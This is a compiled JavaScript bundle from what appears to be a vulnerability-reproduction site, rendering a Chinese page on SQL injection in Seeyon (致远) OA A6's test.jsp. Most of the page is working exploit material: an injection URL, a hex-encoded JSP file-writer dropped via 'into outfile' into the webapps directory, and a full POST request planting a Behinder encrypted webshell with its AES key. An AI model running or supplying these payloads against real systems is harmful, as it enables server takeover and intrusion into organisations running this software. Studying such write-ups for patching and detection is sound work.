(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{1384:function(s,t,a){s.exports=a.p+"assets/img/zhiyuan-25.029f2480.png"},1385:function(s,t,a){s.exports=a.p+"assets/img/zhiyuan-26.5083baec.png"},1386:function(s,t,a){s.exports=a.p+"assets/img/zhiyuan-27.274bf59e.png"},1387:function(s,t,a){s.exports=a.p+"assets/img/zhiyuan-28.a1850d5f.png"},1388:function(s,t,a){s.exports=a.p+"assets/img/zhiyuan-29.3d1ca87e.png"},2274:function(s,t,a){"use strict";a.r(t);var e=a(75),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"致远oa-a6-test-jsp-sql注入漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#致远oa-a6-test-jsp-sql注入漏洞"}},[s._v("#")]),s._v(" 致远OA A6 test.jsp SQL注入漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("致远OA A6")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('title="致远A8+协同管理软件.A6"')]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("访问URL")]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1384),alt:"img"}})]),s._v(" "),e("p",[s._v("返回了当前使用的数据库, 要想写入shell需要知道写入的路径")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1385),alt:"img"}})]),s._v(" "),e("p",[s._v("这里得到路径 "),e("code",[s._v("D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\")])]),s._v(" "),e("p",[s._v("通过 into outfile 写入文件，这里因为 jsp木马存在特殊符号，使用 hex编码 上传允许文件上传的jsp文件")]),s._v(" "),e("div",{staticClass:"language-sql line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sql"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("request"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("getParameter"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"f"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!=")]),e("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("null")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("new java"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("io"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("FileOutputStream"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("application"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("getRealPath"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\\\\"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("request"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("getParameter"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"f"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("write")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("request"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("getParameter"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"t"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("getBytes"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\nHEX编码\n\n"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br")])]),e("div",{staticClass:"language-sql line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-sql"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("yyoa"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("common"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("js"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("menu"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("test"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("jsp?doType"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("101")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("S1"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("unhex"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("273")]),s._v("C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("into"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("outfile"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("E:"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Program Files"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("UFseeyon"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("OA"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("tomcat"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("webapps"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("yyoa"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("test_upload"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("jsp"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1386),alt:"img"}})]),s._v(" "),e("p",[s._v("显示上图则上传成功，访问 test_upload.jsp 为空白不报错页面不存在就是上传成功")]),s._v(" "),e("p",[s._v("在发送请求包上传webshell，这里上传冰蝎")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1387),alt:"img"}})]),s._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[s._v("POST /yyoa/peiqi_upload.jsp?f=testwebshell.jsp\n\nt=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("连接木马")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1388),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=n.exports}}]);